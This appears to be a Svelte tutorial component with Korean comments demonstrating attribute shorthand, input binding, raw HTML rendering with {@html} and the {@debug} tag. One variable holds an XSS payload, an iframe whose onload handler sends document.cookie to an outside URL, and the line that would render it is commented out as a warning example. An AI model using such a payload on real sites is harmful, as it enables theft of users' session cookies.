<script>
  let href = 'https://github.com/Jinwook-Song/svelte-basic';
  let name = 'jinwook';
  let value = 'new input value';
  let isUppercase = false;

  let h1 = '<h1>원시 HTML</h1>';
  let xss =
    '<iframe onload="document.location=`https://github.com/Jinwook-Song/svelte-basic?${document.cookie}`"></iframe>';

  let index = 0;
</script>

<a {href}>{name}</a>

<!-- 보간법 -->
<input {value} on:input={(e) => (value = e.target.value)} />
<input bind:value />

<div>{isUppercase ? 'DIV' : 'div'}</div>

<!-- 원시 HTML -->
{@html h1}
<!-- {@html xss} -->

<!-- 데이터 디버깅 -->
{@debug index}
<h1 on:click={() => (index += 1)}>Hello {name}</h1>
